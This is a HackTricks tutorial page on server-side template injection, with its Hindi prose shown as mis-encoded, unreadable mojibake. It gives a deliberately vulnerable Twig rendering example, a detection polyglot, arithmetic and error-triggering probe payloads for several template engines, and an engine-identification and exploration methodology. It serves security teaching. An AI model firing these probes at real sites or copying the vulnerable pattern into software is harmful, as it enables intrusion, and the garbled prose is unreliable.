# SSTI (рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣,
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗ**.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЗрд╡реЗрдВрдЯ рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреНрдпрд╛ рд╣реИ?

рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдПрдХ рджреБрд╖реНрдкреНрд░рднрд╛рд╡реА рдкреЗрд▓реЛрдб рдХреЛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореВрд▓ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕рд┐рдВрдЯреЗрдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдлрд┐рд░ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди** рд╡реЗрдм рдкреГрд╖реНрдареЛрдВ рдХреЛ **рдирд┐рд░реНрдорд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╣реИрдВ, рдЬреЛ **рд╕реНрдерд┐рд░** рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ **рдЕрд╕реНрдерд╛рдпреА** рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде **рдорд┐рд▓рд╛рдХрд░** рдмрдирд╛рддреЗ рд╣реИрдВред рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ** рд╕реАрдзреЗ **рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ** рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рдбреЗрдЯрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХреЛрдВ рдХреЛ **рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдЯреЗрдореНрдкрд▓реЗрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ** рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рд╕рд░реНрд╡рд░ рдХреЗ **рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддреЗ рд╣реИрдВред

рдПрдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ рдЬреЛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдХреЛрдб рдХрд╛ рд╣реИ:
```php
$output = $twig->render("Dear " . $_GET['name']);
```
рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ **рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛** рд╕реНрд╡рдпрдВ рдХреЛ **рдбрд╛рдЗрдиреЗрдорд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди** рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, `GET` рдкреИрд░рд╛рдореАрдЯрд░ `рдирд╛рдо` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕рд┐рдВрдЯреИрдХреНрд╕ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░реНрдзреА рдХреЛ `рдирд╛рдо` рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдкреЗрд▓реЛрдб рд░рдЦрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ, рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рд╣рдорд▓рд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рдирд╛

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдХрд┐рд╕реА рднреА рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рд╕рд╛рде, рдЙрд╕реЗ рдЦреЛрдЬрдиреЗ рдХреА рдкрд╣рд▓реА рдХрджрдо рд╣реИред рд╢рд╛рдпрдж рд╕рдмрд╕реЗ рд╕рд░рд▓ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реИ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдХреЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдореЗрдВ рдЖрдорддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгреЛрдВ рдХреЗ рдПрдХ рдЕрдиреБрдХреНрд░рдо рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛, рдЬреИрд╕реЗ рдХрд┐ рдкреЙрд▓рд┐рдЧреНрд▓реЙрдЯ `${{<%[%'"}}%\`ред\
рд╕рд░реНрд╡рд░ рдХреЗ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рдмреАрдЪ рдХрд╛ рдЕрдВрддрд░ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред\
рдпрджрд┐ рдХреЛрдИ рддреНрд░реБрдЯрд┐ рдЙрдард╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ рдпрд╣ рдЖрд╕рд╛рдиреА рд╕реЗ рд╕рдордЭрдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рд╕рд░реНрд╡рд░ рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реИ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдХреМрди рд╕рд╛ рдЗрдВрдЬрди рдЪрд▓ рд░рд╣рд╛ рд╣реИред рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рдЙрдореНрдореАрдж рдХрд░ рд░рд╣реЗ рдереЗ рдХрд┐ рд╕рд░реНрд╡рд░ рджрд┐рдП рдЧрдП рдкреНрд░рднрд╛рд╡ рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░реЗрдЧрд╛ рдФрд░ рдпрд╣ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреБрдЫ рдЧрд╛рдпрдм рд╡рд░реНрдг рд╣реИрдВ, рддреЛ рдЖрдк рдПрдХ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╕рд░реНрд╡рд░ рднреА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред

**рдкрддрд╛ рд▓рдЧрд╛рдирд╛ - рд╕рд╛рджрд╛ рдкрд╛рда рд╕рдВрджрд░реНрдн**

рджрд┐рдП рдЧрдП рдЗрдирдкреБрдЯ рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХ рд╕рд╛рдзрд╛рд░рд┐рдд [XSS](../xss-cross-site-scripting/) рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЧрд▓рддреА рд╕реЗ рдЧрд▓рддреА рд╕рдордЭрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЕрдВрддрд░ рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реИ рдпрджрд┐ рдЖрдк рдЯреЗрдореНрдкрд▓реЗрдЯ рд╡реНрдпрдХреНрддрд┐ рдХреЗ рднреАрддрд░ рдЧрдгрд┐рддреАрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ:
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**рдкрддрд╛ рд▓рдЧрд╛рдПрдВ - рдХреЛрдб рд╕рдВрджрд░реНрдн**

рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ** рдХреЛ **рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐** рдХреЗ рднреАрддрд░ рд░рдЦрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ:
```python
engine.render("Hello {{"+greeting+"}}", data)
```
рдЙрд╕ рдкреГрд╖реНрда рдХрд╛ URL рдРрд╕рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ: `http://vulnerable-website.com/?greeting=data.username`

рдпрджрд┐ рдЖрдк **`greeting`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **рдЕрд▓рдЧ рдорд╛рди** рдореЗрдВ **рдмрджрд▓рддреЗ рд╣реИрдВ**, рддреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реЛрдЧрд╛**, рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рдХрд░рддреЗ рд╣реИрдВ: `http://vulnerable-website.com/?greeting=data.username}}hello` рддреЛ, **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛** (рдпрджрд┐ рд╕рдорд╛рдкреНрддрд┐ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╡реНрдпрдХреНрддрд┐ рд╡рд░реНрдг **`}}`** рд╣реЛрдВрдЧреЗ)ред\
рдпрджрд┐ рдЗрди рдкрд░реАрдХреНрд╖рдгреЛрдВ рдХреЗ рджреМрд░рд╛рди рдХреЛрдИ **рддреНрд░реБрдЯрд┐** рдЙрдард╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ рд╕рд░реНрд╡рд░ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рднрдВрдЧ рд╣реЛрдиреЗ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдЖрд╕рд╛рди рд╣реЛрдЧрд╛ред

### рдкрд╣рдЪрд╛рди

рдЬрдм рдЖрдк рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЕрдЧрд▓рд╛ рдХрджрдо рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЯреЗрдореНрдкрд▓реЗрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛рдПрдВ рд╣реЛрддреА рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдХрдИ рдРрд╕реА рд╕рдВрдХреЗрдд рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИрдВ рдЬреЛ HTML рд╡рд░реНрдгреЛрдВ рдХреЗ рд╕рд╛рде рдЯрдХрд░рд╛рдиреЗ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЪреБрдиреА рдЬрд╛рддреА рд╣реИрдВред

рдпрджрд┐ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ рддреЛ рд╕рд░реНрд╡рд░ **рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЛ рдореБрджреНрд░рд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реЛрдЧрд╛** рдФрд░ рдЖрдк **рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЗ рднреАрддрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЗрдВрдЬрди** рдХреЛ рдЦреЛрдЬ рд╕рдХреЗрдВрдЧреЗред рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдкреЗрд▓реЛрдбреНрд╕ рдЬреЛ рддреНрд░реБрдЯрд┐рдпрд╛рдВ рдкреИрджрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

рдЕрдиреНрдпрдерд╛, рдЖрдкрдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ **рд╡рд┐рднрд┐рдиреНрди рднрд╛рд╖рд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреЗрд▓реЛрдб** рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдФрд░ рдпрд╣ рджреЗрдЦрдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рджреНрд╡рд╛рд░рд╛ рдЙрдирдХрд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛рди рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк рд╡рд┐рднрд┐рдиреНрди рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреЗ рд╕рд┐рдВрдЯреИрдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдирд┐рд╡рд╛рд░реНрдп рдЧрдгрд┐рддреАрдп рдкрд░рд┐рдЪрдпреЛрдВ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВред рдлрд┐рд░ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рд╡реЗ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рд░реНрдгрдп рдкреЗрдбрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (272).png>)

### рд╢реЛрд╖рдг

**рдкрдврд╝реЗрдВ**

рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдкрд╣рд▓рд╛ рдХрджрдо рд╣реИ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдкрдврд╝рдирд╛ред рд░реБрдЪрд┐ рдХреЗ рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* рдореВрд▓ рд╕рд┐рдВрдЯреИрдХреНрд╕ рдХреЛ рдХрд╡рд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ 'рдЯреЗрдореНрдкрд▓реЗрдЯ рд▓реЗрдЦрдХреЛрдВ рдХреЗ рд▓рд┐рдП' рдЦрдВрдбред
* 'рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзреА рд╡рд┐рдЪрд╛рд░реЛрдВ' - рдЖрдкрдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣реЗ рдРрдк рдХрд╛ рд╡рд┐рдХрд╛рд╕ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд╡реНрдпрдХреНрддрд┐ рдЗрд╕реЗ рдкрдврд╝рдиреЗ рд╡рд╛рд▓рд╛ рдирд╣реАрдВ рдерд╛, рдФрд░ рдпрд╣ рдХреБрдЫ рдЙрдкрдпреЛрдЧреА рд╕рдВрдХреЗрдд рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* рдмрд┐рд▓реНрдЯрдЗрди рд╡рд┐рдзрд┐рдпреЛрдВ, рдлрд╝рдВрдХреНрд╢рди, рдлрд╝рд┐рд▓реНрдЯрд░ рдФрд░ рдЪрд░реЛрдВ рдХреА рд╕реВрдЪрд┐рдпрд╛рдБред
* рдПрдХреНрд╕рдЯреЗрдВрд╢рди/рдкреНрд▓рдЧрдЗрди рдХреА рд╕реВрдЪрд┐рдпрд╛рдБ - рдХреБрдЫ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

**рдЦреЛрдЬреЗрдВ**

рдпрджрд┐ рдХреЛрдИ рд╢реЛрд╖рдг рдкреНрд░рд╕реНрддрд╛рд╡ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЕрдЧрд▓рд╛ рдХрджрдо рд╣реИ **рдкрд░реНрдпрд╛рд╡рд░рдг рдХреА рдЦреЛрдЬ** рдХрд░рдирд╛ рдФрд░ рдЬрд╛рдирдирд╛ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреНрдпрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд╣реБрдВрдЪ рд╣реИ**ред рдЖрдкрдХреЛ рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕** рдФрд░ рд╡рд┐рдХрд╛рд╕рдХ рджреНрд╡рд╛рд░рд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП **рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕** рджреЛрдиреЛрдВ рдорд┐рд▓реЗрдВрдЧреЗред рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕рд┐рд╕реНрдЯрдо рдПрдХ 'рд╕реЗрд▓реНрдл' рдпрд╛ рдиреЗрдорд╕реНрдкреЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рд╕реНрдХреЛрдк рдореЗрдВ рд╕рдм рдХреБрдЫ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдЖрд╡рдВрдЯрди рдХреЗ рд╡рд┐рд╢реЗрд╖ рддрд░реАрдХреЗ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЖрджрд░реНрд╢ рддрд░реАрдХрд╛ рд╣реЛрддрд╛ рд╣реИред

рдпрджрд┐ рдХреЛрдИ рдмрд┐рд▓реНрдЯрдЗрди рд╕реЗрд▓реНрдл рдСрдмреНрдЬреЗрдХреНрдЯ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдкрдХреЛ [SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) рдФрд░ Burp Intruder рдХреЗ рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ рд╕рдВрдЧреНрд░рд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЪрд░ рдирд╛рдореЛрдВ рдХреЛ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

